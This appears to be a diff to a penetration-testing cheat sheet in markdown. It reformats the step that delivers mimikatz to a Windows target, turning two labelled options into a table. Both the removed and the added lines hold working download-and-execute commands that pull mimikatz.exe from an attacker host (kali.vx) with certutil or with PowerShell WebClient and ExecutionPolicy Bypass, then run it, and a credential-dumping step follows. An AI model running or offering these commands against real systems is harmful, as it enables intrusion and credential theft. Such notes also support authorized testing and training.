@@ -201,22 +201,10 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 
 **On Target:** Download and run `mimikatz`
 
-Option 1: PowerShell
-
-- Download: `(New-Object System.Net.WebClient).DownloadFile()`
-- Run: `Start-Process`
-
-```cmd
-set SRC_URL=http://kali.vx/mimikatz.exe
-set DST_PATH=%TEMP%\mimikatz.exe
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH); Start-Process $env:DST_PATH
-```
-
-Option 2: certutil
-
-```cmd
-certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe
-```
+|   |   |
+|---|---|
+|certutil|`certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe','%TEMP%\mimikatz.exe'); Start-Process %TEMP%\mimikatz.exe`|
 
 **On Target:** mimikatz commands
 
